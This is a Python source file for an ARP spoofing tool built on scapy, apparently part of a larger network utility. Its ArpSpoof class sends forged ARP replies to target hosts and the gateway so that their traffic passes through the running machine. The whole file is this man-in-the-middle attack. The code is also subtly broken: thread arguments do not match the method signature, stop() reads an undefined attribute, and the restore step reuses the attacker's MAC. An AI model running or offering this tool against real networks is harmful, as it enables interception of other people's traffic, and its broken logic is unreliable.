from threading import Lock, Thread, Event as ThreadingEvent
from scapy.all import ARP, send, conf
from scapy.layers.l2 import getmacbyip
from typing import List
from models.host import Host
from services.host_service import HostService
from services.event import Event, EventType
import socket

class ArpSpoof:
    def __init__(self, host_service: HostService):
        self.host_service: HostService = host_service
        self.spoofing_threads: List[Thread] = []
        self.stop_event = ThreadingEvent()
        self.lock = Lock()
        self.is_running: bool = False
        self.target_hosts: List[Host] = []
        self.host_ip: str = socket.gethostbyname(socket.getfqdn())
        self.host_mac: str = getmacbyip(self.host_ip)
        self.gateway_ip: str = conf.route.route("0.0.0.0")[2]
        self.gateway_mac: str = getmacbyip(self.gateway_ip)
        self.THROTTLE: int = 2

    def start(self, target_ips: List[str]) -> None:
        with self.lock:
            if self.is_running:
                raise Exception("ArpSpoof is already running")
            self.is_running = True
            self.target_hosts = self.host_service.get_hosts_from_ips(target_ips)

            event = Event(type=EventType.ARP_SPOOF_STARTED,
                          data=self.target_hosts)
            self.host_service.event_handler.dispatch(event)

            for target_ip in target_ips:
                # Spoof target's perception of the gateway
                self.start_thread(target_ip, self.gateway_ip, self.host_mac)
                # Spoof gateway's perception of the target
                self.start_thread(self.gateway_ip, target_ip, self.host_mac)
                self.stop_event.clear()

    def start_thread(self, target_ip: str, spoof_ip: str, mac: str) -> None:
        thread = Thread(target=self.arp_spoof, args=(target_ip, spoof_ip, mac))
        thread.start()
        self.spoofing_threads.append(thread)

    def stop(self, target_ips: List[str]) -> None:
        if self.target_ips is None:
            raise Exception("No target IPs have been set")

        with self.lock:
            if not self.is_running:
                raise Exception("ArpSpoof is not running")
            self.is_running = False
            self.stop_event.set()

        for thread in self.spoofing_threads:
            thread.join()
        self.spoofing_threads = []

        for target_ip in target_ips:
            # Restore target's perception of the gateway
            self.restore(target_ip, self.gateway_ip,
                         getmacbyip(target_ip), self.host_mac)
            # Restore gateway's perception of the target
            self.restore(self.gateway_ip, target_ip,
                         self.gateway_mac, self.host_mac)

        event = Event(type=EventType.ARP_SPOOF_STOPPED,
                        data=self.target_hosts)
        self.host_service.event_handler.dispatch(event)
        self.target_hosts = None

    def arp_spoof(self, target_ip: str) -> None:
        while self.is_running and not self.stop_event.is_set():
            self.send_arp_packet(target_ip, self.host_ip, self.host_mac)
            self.send_arp_packet(self.host_ip, target_ip, getmacbyip(target_ip))
            self.stop_event.wait(self.THROTTLE)

    def restore(self, destination_ip: str, source_ip: str,
                destination_mac: str, source_mac: str) -> None:
        packet = ARP(op = 2, pdst = destination_ip, hwdst = destination_mac,
                     psrc = source_ip, hwsrc = source_mac)
        send(packet, verbose = False)

    def send_arp_packet(self, ip: str, spoof_ip: str, mac: str) -> None:
        packet = ARP(op = 2, pdst = ip, hwdst = mac, psrc = spoof_ip)
        send(packet, verbose = False)